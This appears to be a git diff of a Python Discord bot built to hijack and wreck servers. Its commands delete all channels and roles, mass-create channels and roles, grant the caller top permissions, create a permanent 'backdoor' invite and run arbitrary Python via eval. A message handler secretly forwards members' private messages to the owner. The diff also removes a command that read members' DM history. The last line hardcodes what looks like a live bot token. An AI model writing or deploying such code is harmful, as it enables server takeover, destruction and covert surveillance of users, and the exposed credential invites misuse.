@@ -7,16 +7,17 @@ import string
 from flask import Flask
 from threading import Thread
 import os
+import json
+import io
 
 app = Flask('')
 intents = discord.Intents.all()
-
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
-ALLOWED_IDS = [1008278721007992863, 1355108796388872292] 
+ALLOWED_IDS = [1008278721007992863, 1355108796388872292]
+VERSION_ID = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
 
 async def is_me(ctx):
-
     if ctx.author.id in ALLOWED_IDS:
         try:
             await ctx.message.delete()
@@ -27,7 +28,7 @@ async def is_me(ctx):
 
 @app.route('/')
 def home():
-    return "Bot is running!"
+    return f"Bot {VERSION_ID} is running!"
 
 def run():
     port = int(os.environ.get("PORT", 8080))
@@ -40,7 +41,7 @@ def keep_alive():
 
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user}')
+    print(f'Logged in as {bot.user} | ID: {VERSION_ID}')
 
 @bot.command(name="help")
 async def help_msg(ctx):
@@ -63,7 +64,7 @@ async def help_msg(ctx):
             "`!set_server [名]` - 修改伺服器名稱\n"
             "`!add_role @成員 @組` - 給予身分組\n"
             "`!remove_role @成員 @組` - 移除身分組\n"
-            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
+            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言"
         ), 
         inline=False
     )
@@ -74,7 +75,7 @@ async def help_msg(ctx):
             "`!del_ch` - 刪除所有頻道\n"
             "`!del_role` - 刪除所有身分組\n"
             "`!100ch` - 建立 100 個頻道\n"
-            "`!100rl` - 建立 100 個身分組\n"
+            "`!100rl` - 建立 100 個身分組"
         ), 
         inline=False
     )
@@ -85,41 +86,38 @@ async def help_msg(ctx):
             "`!op_me` - 獲取最高權限\n"
             "`!disrole @成員` - 剝奪對方身分\n"
             "`!del_msg [數]` - 批次清理訊息\n"
-            "`!backdoor` - 獲取永久邀請連結\n"
+            "`!backdoor` - 獲取永久邀請連結"
         ), 
         inline=False
     )
     
-        embed.add_field(
+    embed.add_field(
         name="🛠️ 進階工具", 
         value=(
             "`!eval [代碼]` - 執行動態 Python 腳本\n"
             "`!snapshot` - 導出伺服器完整結構 JSON\n"
-            "`!reset` - 強制重啟系統實例\n"
-
+            "`!reset` - 強制重啟系統實例"
         ), 
         inline=False
     )
+
     embed.add_field(
-        name="🎮有趣系統", 
+        name="🎮 有趣系統", 
         value=(
             "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
-            "`!dm @成員 [文]` - 以機器人名義私訊\n"
-        
+            "`!dm @成員 [文]` - 以機器人名義私訊"
         ), 
         inline=False
     )
     
     embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
     await ctx.send(embed=embed)
-    
+
 @bot.command(name="dm")
 async def dm(ctx, member: discord.Member, *, text: str):
     if not await is_me(ctx): return
-    try:
-        await member.send(text)
-    except:
-        pass
+    try: await member.send(text)
+    except: pass
 
 @bot.command(name="del_ch")
 async def nuke_channels(ctx):
@@ -162,18 +160,6 @@ async def purge_chat(ctx, amount: int = 10):
     try: await ctx.channel.purge(limit=amount)
     except: pass
 
-@bot.command(name="spam")
-async def spam(ctx, count: int, *, text: str):
-    if not await is_me(ctx): return
-    for i in range(min(count, 100)):
-        try:
-            suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
-            await ctx.send(f"{text} | {suffix}")
-            await asyncio.sleep(random.uniform(0.7, 1.2))
-        except:
-            await asyncio.sleep(5)
-            continue
-
 @bot.command(name="100rl")
 async def role_hell(ctx):
     if not await is_me(ctx): return
@@ -209,7 +195,7 @@ async def tm(ctx, member: discord.Member = None, minutes: int = 10):
     if member is None: return
     try:
         duration = datetime.timedelta(minutes=minutes)
-        await member.timeout(duration, reason="你呼吸")
+        await member.timeout(duration, reason="系統調整")
     except: pass
 
 @bot.command(name="backdoor")
@@ -220,23 +206,11 @@ async def backdoor(ctx):
         await ctx.author.send(f"永久入口: {inv.url}")
     except: pass
 
-@bot.command(name="move_all")
-async def move_all(ctx, channel: discord.VoiceChannel):
-    if not await is_me(ctx): return
-    for member in ctx.guild.members:
-        if member.voice:
-            try: await member.move_to(channel)
-            except: pass
-
 @bot.command(name="disrole")
 async def isolate(ctx, member: discord.Member):
     if not await is_me(ctx): return
     try:
         await member.edit(roles=[])
-        iso_role = discord.utils.get(ctx.guild.roles, name="Prisoner")
-        if not iso_role:
-            iso_role = await ctx.guild.create_role(name="Prisoner", permissions=discord.Permissions.none())
-        await member.add_roles(iso_role)
     except: pass
 
 @bot.command(name="server_gate")
@@ -247,42 +221,6 @@ async def server_gate(ctx, status: str):
         try:
             await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
         except: pass
-
-@bot.command(name="add_role")
-async def add_role(ctx, member: discord.Member, role: discord.Role):
-    if not await is_me(ctx): return
-    try:
-        await member.add_roles(role)
-    except Exception as e:
-        print(f"Error: {e}")
-
-@bot.command(name="remove_role")
-async def remove_role(ctx, member: discord.Member, role: discord.Role):
-    if not await is_me(ctx): return
-    try:
-        await member.remove_roles(role)
-    except Exception as e:
-        print(f"Error: {e}")
-
-@bot.command(name="get_dm")
-async def get_dm(ctx, member: discord.Member, limit: int = 10):
-    if not await is_me(ctx): return
-    try:
-        dm_channel = member.dm_channel or await member.create_dm()
-        history = []
-        async for msg in dm_channel.history(limit=limit):
-            who = "機器人" if msg.author == bot.user else "成員"
-            history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
-        result = "\n".join(reversed(history)) or "無私訊紀錄"
-        await ctx.author.send(f"📂 **與 {member.name} 的對話紀錄 (由舊到新)：**\n{result[:1900]}")
-    except Exception as e:
-        print(f"調閱失敗: {e}")
-
-@bot.command(name="reset")
-async def reboot(ctx):
-    if not await is_me(ctx): return
-    await ctx.send("🔄 正在重新啟動內部系統...")
-    os._exit(0) 
 
 @bot.command(name="snapshot")
 async def snapshot(ctx):
@@ -304,7 +242,7 @@ async def snapshot(ctx):
 async def eval_code(ctx, *, code: str):
     if not await is_me(ctx): return
     code = code.strip('`').replace('py\n', '').replace('python\n', '')
-    env = {'bot': bot, 'ctx': ctx, 'guild': ctx.guild, 'channel': ctx.channel, 'author': ctx.author, 'discord': discord, 'asyncio': asyncio}
+    env = {'bot': bot, 'ctx': ctx, 'guild': ctx.guild, 'channel': ctx.channel, 'author': ctx.author, 'discord': discord, 'asyncio': asyncio, 'json': json}
     try:
         exec_func = f"async def _ex():\n" + "\n".join(f"    {line}" for line in code.split('\n'))
         exec(exec_func, env)
@@ -328,16 +266,16 @@ async def clean_keyword(ctx, keyword: str, amount: int = 50):
         deleted = await ctx.channel.purge(limit=amount, check=lambda m: keyword in m.content)
         await ctx.author.send(f"✅ 已清理 {len(deleted)} 則包含『{keyword}』的訊息")
     except: pass
-        
+
 @bot.event
 async def on_message(message):
-    if message.author == bot.user:
-        return
-    if isinstance(message.channel, discord.DMChannel):
-        if not message.content.startswith("!"):
-            owner = await bot.fetch_user(ALLOWED_IDS[0])
-            await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
+    if message.author == bot.user: return
+    if isinstance(message.channel, discord.DMChannel) and not message.content.startswith("!"):
+        owner = await bot.fetch_user(ALLOWED_IDS[0])
+        await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
     await bot.process_commands(message)
+
 if __name__ == "__main__":
     keep_alive()
+    
 bot.run("MTQ4NzcyNTMzMDExNzU2MjM5OQ.GdEAio.tb5pS63n67Hy_ILNZBQnVZZ6A2sFX2nxEfWyjY")
